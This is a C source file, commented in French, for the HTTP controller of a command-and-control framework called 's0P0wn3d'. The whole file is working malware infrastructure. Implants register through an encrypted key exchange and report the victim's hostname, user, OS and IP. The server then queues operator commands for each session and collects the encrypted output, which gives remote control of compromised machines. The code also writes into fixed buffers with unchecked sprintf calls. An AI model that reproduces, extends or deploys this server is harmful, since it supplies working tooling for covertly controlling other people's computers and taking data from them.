/*
 * s0P0wn3d — Implémentation du serveur HTTP.
 *
 * Serveur HTTP multi-thread simple utilisant POSIX sockets.
 * Route les requêtes vers les handlers du contrôleur.
 */

#include "http_server.h"
#include "crypto.h"
#include "sessions.h"
#include "task_queue.h"
#include "../shared/protocol.h"
#include "../shared/base64.h"
#include "../shared/json.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <openssl/rand.h>

#define MAX_REQUEST_SIZE  (1024 * 1024)   /* 1 MB max */
#define MAX_CONNECTIONS   32

/* ─── Résultats stockés (simple, en mémoire) ──────────────────────────────── */

typedef struct {
    char session_id[S0P_MAX_SESSION_ID];
    task_result_t results[64];
    int count;
} result_store_t;

static result_store_t result_stores[S0P_MAX_SESSIONS];
static int result_store_count = 0;
static pthread_mutex_t results_lock = PTHREAD_MUTEX_INITIALIZER;

static result_store_t *find_or_create_results(const char *session_id) {
    for (int i = 0; i < result_store_count; i++) {
        if (strcmp(result_stores[i].session_id, session_id) == 0)
            return &result_stores[i];
    }
    if (result_store_count >= S0P_MAX_SESSIONS) return NULL;
    result_store_t *rs = &result_stores[result_store_count];
    strncpy(rs->session_id, session_id, S0P_MAX_SESSION_ID - 1);
    rs->count = 0;
    result_store_count++;
    return rs;
}

/* ─── Helpers HTTP ─────────────────────────────────────────────────────────── */

static void send_http_response(int fd, int status_code,
                                const char *content_type,
                                const char *body) {
    char header[512];
    const char *status_text = "OK";
    if (status_code == 404) status_text = "Not Found";
    else if (status_code == 400) status_text = "Bad Request";
    else if (status_code == 500) status_text = "Internal Server Error";

    size_t body_len = body ? strlen(body) : 0;
    snprintf(header, sizeof(header),
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: %s\r\n"
        "Content-Length: %zu\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "Connection: close\r\n"
        "\r\n",
        status_code, status_text, content_type, body_len);

    ssize_t _w = write(fd, header, strlen(header));
    (void)_w;
    if (body && body_len > 0) {
        _w = write(fd, body, body_len);
        (void)_w;
    }
}

static void send_json(int fd, int status, const char *json) {
    send_http_response(fd, status, "application/json", json);
}

static void send_404(int fd) {
    send_json(fd, 404, "{\"error\":\"not found\"}");
}

/* ─── Parsing de requête HTTP ──────────────────────────────────────────────── */

typedef struct {
    char method[8];
    char path[512];
    char *body;
    size_t body_len;
} http_request_t;

static int parse_http_request(const char *raw, size_t raw_len,
                               http_request_t *req) {
    memset(req, 0, sizeof(http_request_t));

    /* Extraire la méthode */
    const char *space = strchr(raw, ' ');
    if (!space) return -1;
    size_t method_len = space - raw;
    if (method_len >= sizeof(req->method)) return -1;
    memcpy(req->method, raw, method_len);
    req->method[method_len] = '\0';

    /* Extraire le path */
    const char *path_start = space + 1;
    const char *path_end = strchr(path_start, ' ');
    if (!path_end) return -1;
    size_t path_len = path_end - path_start;
    if (path_len >= sizeof(req->path)) return -1;
    memcpy(req->path, path_start, path_len);
    req->path[path_len] = '\0';

    /* Extraire le body (après \r\n\r\n) */
    const char *body_start = strstr(raw, "\r\n\r\n");
    if (body_start) {
        body_start += 4;
        req->body = (char *)body_start;
        req->body_len = raw_len - (body_start - raw);
    }

    return 0;
}

/* ─── Handlers de routes ───────────────────────────────────────────────────── */

/* GET /pubkey */
static void handle_get_pubkey(int fd) {
    char *pem = crypto_get_public_key_pem();
    if (!pem) {
        send_json(fd, 500, "{\"error\":\"crypto not initialized\"}");
        return;
    }

    /* Construire la réponse JSON avec la clé PEM */
    char *response = malloc(strlen(pem) + 100);
    if (response) {
        /* Échapper les newlines du PEM pour JSON */
        char *escaped = malloc(strlen(pem) * 2 + 1);
        if (escaped) {
            size_t j = 0;
            for (size_t i = 0; pem[i]; i++) {
                if (pem[i] == '\n') {
                    escaped[j++] = '\\';
                    escaped[j++] = 'n';
                } else {
                    escaped[j++] = pem[i];
                }
            }
            escaped[j] = '\0';
            sprintf(response, "{\"public_key_pem\":\"%s\"}", escaped);
            free(escaped);
        }
        send_json(fd, 200, response);
        free(response);
    }
    free(pem);
}

/* POST /register */
static void handle_register(int fd, const http_request_t *req) {
    if (!req->body || req->body_len == 0) {
        send_json(fd, 400, "{\"error\":\"empty body\"}");
        return;
    }

    /* S'assurer que le body est null-terminé */
    char *body = malloc(req->body_len + 1);
    memcpy(body, req->body, req->body_len);
    body[req->body_len] = '\0';

    /* Extraire encrypted_key et host_info du JSON */
    char *encrypted_key = json_extract_string(body, "encrypted_key");
    if (!encrypted_key) {
        send_json(fd, 400, "{\"error\":\"missing encrypted_key\"}");
        free(body);
        return;
    }

    /* Construire host_info_t depuis le JSON */
    host_info_t host;
    memset(&host, 0, sizeof(host));
    char *hostname = json_extract_nested(body, "host_info", "hostname");
    char *os = json_extract_nested(body, "host_info", "os");
    char *username = json_extract_nested(body, "host_info", "username");
    char *arch = json_extract_nested(body, "host_info", "arch");
    char *ip = json_extract_nested(body, "host_info", "ip");

    if (hostname) strncpy(host.hostname, hostname, S0P_MAX_HOSTNAME - 1);
    if (os) strncpy(host.os, os, S0P_MAX_OS - 1);
    if (username) strncpy(host.username, username, S0P_MAX_USERNAME - 1);
    if (arch) strncpy(host.arch, arch, sizeof(host.arch) - 1);
    if (ip) strncpy(host.ip, ip, S0P_MAX_IP - 1);
    strncpy(host.implant_version, S0P_VERSION, sizeof(host.implant_version) - 1);

    free(hostname); free(os); free(username); free(arch); free(ip);

    /* Déchiffrer la clé AES */
    uint8_t aes_key[AES_KEY_SIZE];
    if (crypto_decrypt_aes_key(encrypted_key, aes_key) != 0) {
        send_json(fd, 400, "{\"error\":\"failed to decrypt AES key\"}");
        free(encrypted_key);
        free(body);
        return;
    }

    /* Enregistrer la session */
    char session_id[S0P_MAX_SESSION_ID];
    session_t *session = sessions_register(&host, aes_key, session_id);
    if (!session) {
        send_json(fd, 500, "{\"error\":\"session limit reached\"}");
        free(encrypted_key);
        free(body);
        return;
    }

    /* Initialiser le stockage de résultats */
    find_or_create_results(session_id);

    /* Réponse */
    char response[256];
    snprintf(response, sizeof(response),
        "{\"session_id\":\"%s\",\"status\":\"registered\"}", session_id);
    send_json(fd, 200, response);

    free(encrypted_key);
    free(body);
}

/* GET /tasks/{session_id} */
static void handle_get_tasks(int fd, const char *session_id) {
    session_t *session = sessions_get(session_id);
    if (!session) {
        send_404(fd);
        return;
    }
    sessions_touch(session_id);

    /* Récupérer toutes les tâches en attente */
    task_t tasks[16];
    int count = 0;
    task_t t;
    while (count < 16 && task_queue_dequeue(session_id, &t) == 0) {
        tasks[count++] = t;
    }

    if (count == 0) {
        char response[128];
        snprintf(response, sizeof(response),
            "{\"session_id\":\"%s\",\"status\":\"no_tasks\"}", session_id);
        send_json(fd, 200, response);
        return;
    }

    /* Construire le JSON des tâches */
    char *json = malloc(S0P_MAX_PAYLOAD);
    if (!json) {
        send_json(fd, 500, "{\"error\":\"allocation failed\"}");
        return;
    }

    int offset = 0;
    offset += sprintf(json + offset,
        "{\"type\":\"tasks\",\"tasks\":[");
    for (int i = 0; i < count; i++) {
        if (i > 0) offset += sprintf(json + offset, ",");
        offset += sprintf(json + offset,
            "{\"task_id\":\"%s\",\"command\":\"%s\",\"args\":\"%s\"}",
            tasks[i].task_id, tasks[i].command, tasks[i].args);
    }
    offset += sprintf(json + offset, "]}");

    /* Chiffrer avec AES-GCM */
    char *nonce_b64, *payload_b64, *tag_b64;
    if (crypto_aes_encrypt(session->aes_key, (uint8_t *)json, strlen(json),
                           &nonce_b64, &payload_b64, &tag_b64) != 0) {
        send_json(fd, 500, "{\"error\":\"encryption failed\"}");
        free(json);
        return;
    }
    free(json);

    /* Construire la réponse chiffrée */
    char *response = malloc(S0P_MAX_PAYLOAD);
    if (response) {
        snprintf(response, S0P_MAX_PAYLOAD,
            "{\"session_id\":\"%s\",\"status\":\"tasks\","
            "\"nonce\":\"%s\",\"payload\":\"%s\",\"tag\":\"%s\"}",
            session_id, nonce_b64, payload_b64, tag_b64);
        send_json(fd, 200, response);
        free(response);
    }

    free(nonce_b64);
    free(payload_b64);
    free(tag_b64);
}

/* POST /results/{session_id} */
static void handle_submit_results(int fd, const char *session_id,
                                   const http_request_t *req) {
    session_t *session = sessions_get(session_id);
    if (!session) {
        send_404(fd);
        return;
    }
    sessions_touch(session_id);

    if (!req->body || req->body_len == 0) {
        send_json(fd, 400, "{\"error\":\"empty body\"}");
        return;
    }

    char *body = malloc(req->body_len + 1);
    memcpy(body, req->body, req->body_len);
    body[req->body_len] = '\0';

    /* Extraire les champs chiffrés */
    char *nonce_b64 = json_extract_string(body, "nonce");
    char *payload_b64 = json_extract_string(body, "payload");
    char *tag_b64 = json_extract_string(body, "tag");

    if (!nonce_b64 || !payload_b64 || !tag_b64) {
        send_json(fd, 400, "{\"error\":\"missing crypto fields\"}");
        free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
        return;
    }

    /* Déchiffrer avec AES-GCM */
    uint8_t plaintext[S0P_MAX_OUTPUT];
    int pt_len = crypto_aes_decrypt(session->aes_key, nonce_b64,
                                     payload_b64, tag_b64,
                                     plaintext, sizeof(plaintext));
    if (pt_len < 0) {
        send_json(fd, 400, "{\"error\":\"decryption failed\"}");
        free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
        return;
    }
    plaintext[pt_len] = '\0';

    /* Parser le résultat */
    task_result_t result;
    if (json_parse_result((char *)plaintext, &result) != 0) {
        send_json(fd, 400, "{\"error\":\"invalid result format\"}");
        free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
        return;
    }

    /* Stocker le résultat */
    pthread_mutex_lock(&results_lock);
    result_store_t *rs = find_or_create_results(session_id);
    if (rs && rs->count < 64) {
        rs->results[rs->count++] = result;
    }
    pthread_mutex_unlock(&results_lock);

    printf("[+] Résultat reçu de %s\n", session_id);
    printf("    Tâche   : %s\n", result.task_id);
    printf("    Statut  : %s\n", result.status);
    printf("    Sortie  : %.200s\n", result.output);

    char *ack = json_build_ack();
    send_json(fd, 200, ack);
    free(ack);

    free(body); free(nonce_b64); free(payload_b64); free(tag_b64);
}

/* GET /sessions */
static void handle_list_sessions(int fd) {
    session_t sessions_buf[S0P_MAX_SESSIONS];
    int count = sessions_list(sessions_buf, S0P_MAX_SESSIONS);
    char *json = json_build_sessions(sessions_buf, count);
    send_json(fd, 200, json ? json : "{\"sessions\":[],\"total\":0}");
    free(json);
}

/* POST /sessions/{session_id}/task */
static void handle_assign_task(int fd, const char *session_id,
                                const http_request_t *req) {
    session_t *session = sessions_get(session_id);
    if (!session) {
        send_404(fd);
        return;
    }

    if (!req->body || req->body_len == 0) {
        send_json(fd, 400, "{\"error\":\"empty body\"}");
        return;
    }

    char *body = malloc(req->body_len + 1);
    memcpy(body, req->body, req->body_len);
    body[req->body_len] = '\0';

    char *command = json_extract_string(body, "command");
    char *args = json_extract_string(body, "args");

    if (!command) {
        send_json(fd, 400, "{\"error\":\"missing command\"}");
        free(body); free(command); free(args);
        return;
    }

    task_t task;
    memset(&task, 0, sizeof(task));
    /* Générer un task_id */
    uint8_t tid[16];
    RAND_bytes(tid, sizeof(tid));
    snprintf(task.task_id, S0P_MAX_TASK_ID,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        tid[0], tid[1], tid[2], tid[3], tid[4], tid[5],
        tid[6], tid[7], tid[8], tid[9],
        tid[10], tid[11], tid[12], tid[13], tid[14], tid[15]);
    strncpy(task.command, command, S0P_MAX_COMMAND - 1);
    if (args) strncpy(task.args, args, S0P_MAX_ARGS - 1);

    task_queue_enqueue(session_id, &task);

    printf("[+] Tâche assignée à %s : %s %s\n",
           session_id, command, args ? args : "");

    char response[512];
    snprintf(response, sizeof(response),
        "{\"status\":\"queued\",\"task_id\":\"%s\"}", task.task_id);
    send_json(fd, 200, response);

    free(body); free(command); free(args);
}

/* GET /sessions/{session_id}/results */
static void handle_get_results(int fd, const char *session_id) {
    pthread_mutex_lock(&results_lock);
    result_store_t *rs = find_or_create_results(session_id);
    if (!rs) {
        pthread_mutex_unlock(&results_lock);
        send_404(fd);
        return;
    }

    char *json = malloc(S0P_MAX_PAYLOAD * (rs->count + 1));
    if (json) {
        int offset = 0;
        offset += sprintf(json + offset, "{\"results\":[");
        for (int i = 0; i < rs->count; i++) {
            if (i > 0) offset += sprintf(json + offset, ",");
            char *r = json_build_result(&rs->results[i]);
            if (r) {
                offset += sprintf(json + offset, "%s", r);
                free(r);
            }
        }
        offset += sprintf(json + offset, "],\"total\":%d}", rs->count);
        send_json(fd, 200, json);
        free(json);
    }
    pthread_mutex_unlock(&results_lock);
}

/* GET /health */
static void handle_health(int fd) {
    session_t buf[S0P_MAX_SESSIONS];
    int count = sessions_list(buf, S0P_MAX_SESSIONS);
    char response[128];
    snprintf(response, sizeof(response),
        "{\"status\":\"ok\",\"sessions\":%d}", count);
    send_json(fd, 200, response);
}

/* ─── Dispatch des routes ───────────────────────────────────────────────────── */

static void route_request(int fd, const http_request_t *req) {
    const char *path = req->path;

    /* GET /pubkey */
    if (strcmp(req->method, "GET") == 0 && strcmp(path, "/pubkey") == 0) {
        handle_get_pubkey(fd);
        return;
    }

    /* POST /register */
    if (strcmp(req->method, "POST") == 0 && strcmp(path, "/register") == 0) {
        handle_register(fd, req);
        return;
    }

    /* GET /tasks/{session_id} */
    if (strcmp(req->method, "GET") == 0 && strncmp(path, "/tasks/", 7) == 0) {
        handle_get_tasks(fd, path + 7);
        return;
    }

    /* POST /results/{session_id} */
    if (strcmp(req->method, "POST") == 0 && strncmp(path, "/results/", 9) == 0) {
        handle_submit_results(fd, path + 9, req);
        return;
    }

    /* GET /sessions */
    if (strcmp(req->method, "GET") == 0 && strcmp(path, "/sessions") == 0) {
        handle_list_sessions(fd);
        return;
    }

    /* POST /sessions/{session_id}/task */
    if (strcmp(req->method, "POST") == 0 && strncmp(path, "/sessions/", 10) == 0) {
        const char *rest = path + 10;
        const char *slash = strstr(rest, "/task");
        if (slash) {
            char session_id[S0P_MAX_SESSION_ID];
            size_t id_len = slash - rest;
            if (id_len < S0P_MAX_SESSION_ID) {
                memcpy(session_id, rest, id_len);
                session_id[id_len] = '\0';
                handle_assign_task(fd, session_id, req);
                return;
            }
        }
    }

    /* GET /sessions/{session_id}/results */
    if (strcmp(req->method, "GET") == 0 && strncmp(path, "/sessions/", 10) == 0) {
        const char *rest = path + 10;
        const char *slash = strstr(rest, "/results");
        if (slash) {
            char session_id[S0P_MAX_SESSION_ID];
            size_t id_len = slash - rest;
            if (id_len < S0P_MAX_SESSION_ID) {
                memcpy(session_id, rest, id_len);
                session_id[id_len] = '\0';
                handle_get_results(fd, session_id);
                return;
            }
        }
    }

    /* GET /health */
    if (strcmp(req->method, "GET") == 0 && strcmp(path, "/health") == 0) {
        handle_health(fd);
        return;
    }

    send_404(fd);
}

/* ─── Thread de connexion ───────────────────────────────────────────────────── */

static void *connection_thread(void *arg) {
    int fd = *(int *)arg;
    free(arg);

    char *buffer = malloc(MAX_REQUEST_SIZE);
    if (!buffer) {
        close(fd);
        return NULL;
    }

    /* Lire la requête */
    size_t total_read = 0;
    while (total_read < MAX_REQUEST_SIZE - 1) {
        ssize_t n = read(fd, buffer + total_read,
                         MAX_REQUEST_SIZE - total_read - 1);
        if (n <= 0) break;
        total_read += n;
        buffer[total_read] = '\0';
        /* Vérifier si on a reçu tout le body (cherche Content-Length) */
        if (total_read > 4) {
            char *header_end = strstr(buffer, "\r\n\r\n");
            if (header_end) {
                /* Chercher Content-Length */
                char *cl = strstr(buffer, "Content-Length:");
                if (cl) {
                    size_t body_start = (header_end + 4) - buffer;
                    int content_length = atoi(cl + 15);
                    if (total_read >= body_start + content_length)
                        break;
                } else {
                    break; /* Pas de Content-Length, on a les headers */
                }
            }
        }
    }

    if (total_read > 0) {
        http_request_t req;
        if (parse_http_request(buffer, total_read, &req) == 0) {
            route_request(fd, &req);
        } else {
            send_404(fd);
        }
    }

    free(buffer);
    close(fd);
    return NULL;
}

/* ─── Démarrage du serveur ──────────────────────────────────────────────────── */

int http_server_start(int port) {
    int server_fd;
    struct sockaddr_in addr;

    signal(SIGPIPE, SIG_IGN); /* Ignorer les broken pipes */

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return -1;
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(server_fd);
        return -1;
    }

    if (listen(server_fd, MAX_CONNECTIONS) < 0) {
        perror("listen");
        close(server_fd);
        return -1;
    }

    printf("[+] Serveur HTTP en écoute sur le port %d\n", port);
    printf("[+] Endpoints:\n");
    printf("    GET  /pubkey\n");
    printf("    POST /register\n");
    printf("    GET  /tasks/{session_id}\n");
    printf("    POST /results/{session_id}\n");
    printf("    GET  /sessions\n");
    printf("    POST /sessions/{id}/task\n");
    printf("    GET  /sessions/{id}/results\n");
    printf("    GET  /health\n\n");

    /* Boucle d'accept */
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd,
                               (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        /* Lancer un thread pour cette connexion */
        int *fd_ptr = malloc(sizeof(int));
        *fd_ptr = client_fd;

        pthread_t tid;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        pthread_create(&tid, &attr, connection_thread, fd_ptr);
        pthread_attr_destroy(&attr);
    }

    close(server_fd);
    return 0;
}
